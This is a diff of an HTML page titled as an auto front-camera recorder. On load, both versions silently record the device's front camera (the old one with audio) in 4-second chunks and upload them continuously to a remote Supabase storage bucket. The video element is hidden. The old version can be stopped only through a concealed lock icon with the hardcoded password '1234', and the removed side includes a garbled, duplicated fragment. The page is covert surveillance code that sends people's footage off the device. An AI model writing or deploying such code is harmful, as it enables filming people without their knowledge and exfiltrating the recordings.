@@ -1,234 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Auto Video Recorder</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-  :root {
-    --success: #2a9d8f;
-    --error: #e63946;
-    --dark: #000;
-    --light: #fff;
-  }
-  *{margin:0;padding:0;box-sizing:border-box;}
-  body{background:var(--dark);color:var(--light);font-family:'Segoe UI',sans-serif;overflow:hidden;}
-  .lock-icon{position:fixed;top:10px;right:10px;font-size:1.5rem;color:white;cursor:pointer;z-index:1000;}
-  #passwordInput{position:fixed;top:50px;right:10px;padding:10px;border-radius:50px;border:none;width:150px;display:none;z-index:1000;}
-  .notification{position:fixed;top:20px;right:20px;padding:15px 25px;border-radius:10px;background:var(--success);color:white;box-shadow:0 5px 15px rgba(0,0,0,0.2);transform:translateX(100%);transition:transform 0.3s ease;z-index:1001;}
-  .notification.show{transform:translateX(0);}
-  video{display:none;}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auto Front Camera Recorder & Upload</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    video { display: none; }
+  </style>
 </head>
 <body>
-<i class="fas fa-lock lock-icon" id="lockIcon"></i>
-<input type="password" id="passwordInput" placeholder="Enter password">
-<div class="notification" id="notification"><span id="notificationText"></span></div>
-<video id="preview" autoplay muted playsinline></video>
+  <video id="camera" autoplay muted></video>
+  <script type="module">
+    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-  const SUPABASE_URL = "https://eizhtvtchspiefxutzlg.supabase.co";
-  const SUPABASE_KEY = "PASTE_YOUR_ANON_KEY_HERE"; // <-- Replace with your anon key
-  const BUCKET_NAME = "recordings";
-  const PASSWORD = "1234";
+    // Supabase setup
+    const supabaseUrl = 'https://eizhtvtchspiefxutzlg.supabase.co'
+    const supabaseKey = '<YOUR_ANON_OR_SERVICE_KEY>' // Replace with a secure key or signed upload URL
+    const supabase = createClient(supabaseUrl, supabaseKey)
 
-  const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-  const preview = document.getElementById("preview");
-  const lockIcon = document.getElementById("lockIcon");
-  const passwordInput = document.getElementById("passwordInput");
-  const notification = document.getElementById("notification");
-  const notificationText = document.getElementById("notificationText");
-
-  let recording = true;
-  let mediaRecorder;
-  let recordedChunks = [];
-
-  function showNotification(msg, type='success'){
-    notificationText.textContent = msg;
-    notification.style.background = type==='error'? '#e63946':'#2a9d8f';
-    notification.classList.add('show');
-    setTimeout(()=>notification.classList.remove('show'),3000);
-  }
-
-  async function initCameraAndRecord() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
-      preview.srcObject = stream;
-      autoRecordLoop(stream);
-    } catch(err){
-      console.error("Camera access denied", err);
-      showNotification("Camera permission denied","error");
-    }
-  }
-
-  async function autoRecordLoop(stream){
-    while(true){
-      if(recording){
-        recordedChunks=[];
-        mediaRecorder = new MediaRecorder(stream,{mimeType:'video/webm; codecs=vp9,opus'});
-        mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
-        mediaRecorder.onstop = uploadRecording;
-        mediaRecorder.start();
-        await new Promise(r=>setTimeout(r,4000)); // 4 sec recording
-        mediaRecorder.stop();
-      } else {
-        await new Promise(r=>setTimeout(r,1000));
-      }
-    }
-  }
-
-  async function uploadRecording(){
-    if(recordedChunks.length===0) return;
-    const blob = new Blob(recordedChunks,{type:"video/webm"});
-    const filename = `rec_${Date.now()}.webm`;
-    const {error} = await client.storage.from(BUCKET_NAME).upload(filename,blob,{contentType:"video/webm",upsert:false});
-    if(error){ console.error(error); showNotification('Upload failed','error'); return; }
-    showNotification('Recording uploaded');
-    await keepOnlyLatestFour();
-  }
-
-  async function keepOnlyLatestFour(){
-    const {data,error} = await client.storage.from(BUCKET_NAME).list();
-    if(error || !data) return;
-    const files = data.sort((a,b)=>b.name.localeCompare(a.name));
-    const old = files.slice(4);
-    for(const f of old) await client.storage.from(BUCKET_NAME).remove([f.name]);
-  }
-
-  lockIcon.addEventListener('click',()=>{
-    passwordInput.style.display='block';
-    passwordInput.focus();
-  });
-
-  passwordInput.addEventListener('keypress', e=>{
-    if(e.key==='Enter'){
-      if(passwordInput.value === PASSWORD){
-        recording=false;
-        stopRecording();
-        passwordInput.style.display='none';
-        showNotification('Recording stopped and locked');
-      } else {
-        showNotification('Wrong password!','error');
-      }
-      passwordInput.value='';
-    }
-  });
-
-  function stopRecording(){
-    if(mediaRecorder && mediaRecorder.state==='recording'){
-      mediaRecorder.stop();
-      if(mediaRecorder.stream){
-        mediaRecorder.stream.getTracks().forEach(t=>t.stop());
-      }
-    }
-  }
-
-  document.addEventListener('DOMContentLoaded', ()=>{ initCameraAndRecord(); });
-</script>
-</body>
-</html>    const BUCKET_NAME = "recordings";
-    const PASSWORD = "1234";
-
-    const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-
-    const preview = document.getElementById("preview");
-    const lockIcon = document.getElementById("lockIcon");
-    const passwordInput = document.getElementById("passwordInput");
-    const notification = document.getElementById("notification");
-    const notificationText = document.getElementById("notificationText");
-
-    let recording = true;
-    let mediaRecorder;
-    let recordedChunks = [];
-
-    // ==== NOTIFICATIONS ====
-    function showNotification(msg, type='success'){
-      notificationText.textContent = msg;
-      notification.style.background = type==='error'? '#e63946':'#2a9d8f';
-      notification.classList.add('show');
-      setTimeout(()=>notification.classList.remove('show'),3000);
-    }
-
-    // ==== RECORDING LOGIC ====
-    async function startRecording() {
+    async function recordAndUpload() {
       try {
-        recordedChunks = [];
-        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
-        preview.srcObject = stream;
-        mediaRecorder = new MediaRecorder(stream, {mimeType:'video/webm; codecs=vp9,opus'});
-        mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
-        mediaRecorder.onstop = uploadRecording;
-        mediaRecorder.start();
-      } catch(err) {
-        console.error(err);
-        showNotification('Camera access denied','error');
-      }
-    }
+        // Request front camera
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        })
 
-    function stopRecording() {
-      if(mediaRecorder && mediaRecorder.state==='recording'){
-        mediaRecorder.stop();
-        mediaRecorder.stream.getTracks().forEach(track=>track.stop());
-      }
-    }
+        const video = document.getElementById('camera')
+        video.srcObject = stream
 
-    async function uploadRecording() {
-      if(recordedChunks.length===0) return;
-      const blob = new Blob(recordedChunks, {type:"video/webm"});
-      const filename = `rec_${Date.now()}.webm`;
-      const {error} = await client.storage.from(BUCKET_NAME).upload(filename, blob, {contentType:"video/webm", upsert:false});
-      if(error) { console.error(error); showNotification('Upload failed','error'); return; }
-      showNotification('Recording uploaded');
-      await keepOnlyLatestFour();
-    }
+        async function recordChunk() {
+          const mediaRecorder = new MediaRecorder(stream)
+          let chunks = []
 
-    async function keepOnlyLatestFour() {
-      const {data,error} = await client.storage.from(BUCKET_NAME).list();
-      if(error || !data) return;
-      const files = data.sort((a,b)=>b.name.localeCompare(a.name));
-      const old = files.slice(4);
-      for(const f of old) await client.storage.from(BUCKET_NAME).remove([f.name]);
-    }
+          mediaRecorder.ondataavailable = e => {
+            if (e.data.size > 0) chunks.push(e.data)
+          }
 
-    // ==== AUTO RECORD LOOP ====
-    async function autoRecordLoop() {
-      while(true){
-        if(recording){
-          await startRecording();
-          await new Promise(r => setTimeout(r,4000)); // record 4 seconds
-          stopRecording();
-        } else {
-          await new Promise(r=>setTimeout(r,1000));
+          mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'video/webm' })
+            chunks = []
+
+            const filename = `recording_${Date.now()}.webm`
+
+            const { data, error } = await supabase
+              .storage
+              .from('recordings')
+              .upload(filename, blob, { cacheControl: '3600', upsert: true })
+
+            if (error) console.error('Upload error:', error)
+            else console.log('Uploaded:', data.path)
+
+            // Start next recording automatically
+            setTimeout(recordChunk, 100) // slight delay to prevent overlap
+          }
+
+          mediaRecorder.start()
+          setTimeout(() => mediaRecorder.stop(), 4000) // 4-second chunks
         }
+
+        // Start first recording chunk
+        recordChunk()
+
+      } catch (err) {
+        console.error('Camera access error:', err)
       }
     }
 
-    // ==== LOCK / PASSWORD LOGIC ====
-    lockIcon.addEventListener('click', () => {
-      passwordInput.classList.remove('hidden');
-      passwordInput.focus();
-    });
-
-    passwordInput.addEventListener('keypress', e => {
-      if(e.key === 'Enter'){
-        if(passwordInput.value === PASSWORD){
-          recording = false;
-          stopRecording();
-          passwordInput.classList.add('hidden');
-          showNotification('Recording stopped and locked');
-        } else {
-          showNotification('Wrong password!','error');
-        }
-        passwordInput.value = '';
-      }
-    });
-
-    // ==== INIT ====
-    document.addEventListener('DOMContentLoaded', () => {
-      autoRecordLoop();
-    });
+    recordAndUpload()
   </script>
 </body>
 </html>
